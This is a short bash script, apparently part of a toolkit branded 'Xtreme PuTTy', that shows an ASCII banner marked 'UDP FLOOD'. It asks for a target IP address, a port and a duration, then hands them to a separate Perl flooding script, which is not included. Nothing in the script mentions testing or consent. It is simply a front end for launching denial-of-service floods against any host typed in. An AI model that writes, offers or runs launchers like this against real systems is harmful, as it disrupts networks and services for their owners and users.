# Trap Signal Script
#
exit_script()
{
  echo "* * *Trap * * *"
  ./menu
}

udp_flooda()
{
    clear
    echo -e " ${BLUE} "
	echo "  +-----------------------------------------------------------------------+ "
    echo "  ¦¦¦             Xtreme PuTTy powered by Xtreme Inc                    ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "                                                         
    echo -e "  ¦¦¦${RED}                      __  ___                     ${BLUE}                 ¦¦¦ " 
    echo -e "  ¦¦¦${RED}                      \ \/ / |_ _ _ ___ _ __  ___ ${BLUE}                 ¦¦¦ " 
    echo -e "  ¦¦¦${RED}                       >  <|  _| '_/ -_) '  \/ -_)${BLUE}                 ¦¦¦ "
    echo -e "  ¦¦¦${RED}                      /_/\_\\__ |_| \___|_|_|_\___|${BLUE}                 ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "
    echo "  ¦¦¦                           Version 1.0                             ¦¦¦ "
    echo "  ¦¦¦+--------------------------------------------------------------------¦ " 
    echo "  ¦¦¦                              UDP FLOOD                            ¦¦¦ "
    echo "  +-----------------------------------------------------------------------+ "
echo "Enter target ip please :"
read ip
echo "Enter a Port Number :"
read port
echo "Enter a the time :"
read time
./gott.1.pl $ip $port 0 $time
}

